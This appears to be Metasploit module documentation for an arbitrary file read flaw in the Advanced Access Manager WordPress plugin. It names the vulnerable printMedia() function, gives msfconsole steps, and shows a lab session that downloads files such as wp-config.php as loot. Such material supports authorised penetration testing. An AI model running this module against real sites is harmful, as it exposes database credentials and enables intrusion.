## Description
The Advanced Access Manager WordPress plugin, versions before 5.9.9, allowed reading arbitrary files.
This way one can download the wp-config.php file and get access to the database, which is publicly reachable on many servers.
The affected function was the printMedia() function in the application/Core/Media.php file.

## Verification Steps
Confirm that functionality works:
1. Start `msfconsole`
2. use `auxiliary/scanner/http/wp_advance_access_manager_file_read`
3. Set the `RHOSTS`
4. Set `TARGETURI`
5. Set `RPORT`
6. Run the exploit: `run`

## Scenarios
```
msf5 > use auxiliary/scanner/http/wp_advance_access_manager_file_read
msf5 auxiliary(scanner/http/wp_advance_access_manager_file_read) > set rhosts 192.168.1.15
rhosts => 192.168.1.15
msf5 auxiliary(scanner/http/wp_advance_access_manager_file_read) > set TARGETURI wordpress/
TARGETURI => wordpress/
msf5 auxiliary(scanner/http/wp_advance_access_manager_file_read) > run

[*] Downloading file...

[....Content File....]

[+] File saved in: /home/thien/.msf4/loot/20211013042725_default_192.168.1.15_advance_access_m_746643.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
## Test environment
Windows 10 running WordPress 5.8.1, Advanced Access Manager 5.9.8

## References
![advance_access_manager](https://user-images.githubusercontent.com/60764841/137097497-389a79d5-4857-40f3-acd3-8227dc405a4d.png)
